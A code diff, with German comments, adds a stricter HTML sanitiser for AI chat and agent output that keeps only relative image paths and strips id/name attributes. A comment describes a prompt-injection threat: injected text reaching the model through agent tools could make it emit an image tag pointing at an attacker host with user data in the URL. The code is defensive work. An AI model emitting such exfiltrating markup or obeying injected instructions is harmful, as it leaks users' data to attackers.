@@ -65,6 +65,31 @@ export function sanitizeHtml(dirty) {
 }
 
 /**
+ * Für KI-Ausgaben (Chat, Agent): strenger als `sanitizeHtml` (Audit A2-19, F2).
+ *
+ * Eine Prompt-Injection in Fremdtext, der über die Agent-Werkzeuge beim Modell
+ * ankommt, könnte `<img src="https://angreifer/…?d=<Daten>">` ausgeben lassen —
+ * der Browser lädt das Bild beim Anzeigen und schickt die Daten im Pfad mit.
+ * Deshalb hier Bilder nur von der eigenen App (relative Pfade) und kein
+ * `id`/`name` (DOM-Clobbering).
+ */
+export function sanitizeKiHtml(dirty) {
+    if (!dirty) return ''
+    const sauber = DOMPurify.sanitize(sanitizeHtml(dirty), {
+        // `class` bleibt: der eigene Markdown-Renderer setzt Stilklassen.
+        FORBID_ATTR: ['id', 'name'],
+        RETURN_DOM_FRAGMENT: true,
+    })
+    for (const img of sauber.querySelectorAll('img')) {
+        const src = img.getAttribute('src') || ''
+        if (!/^\/(?!\/)/.test(src)) img.remove()
+    }
+    const huelle = document.createElement('div')
+    huelle.appendChild(sauber)
+    return huelle.innerHTML
+}
+
+/**
  * Eine fremde URL für ein `:href`-Attribut sicher machen.
  *
  * `sanitizeHtml` filtert `href` nur INNERHALB von HTML, das durch DOMPurify
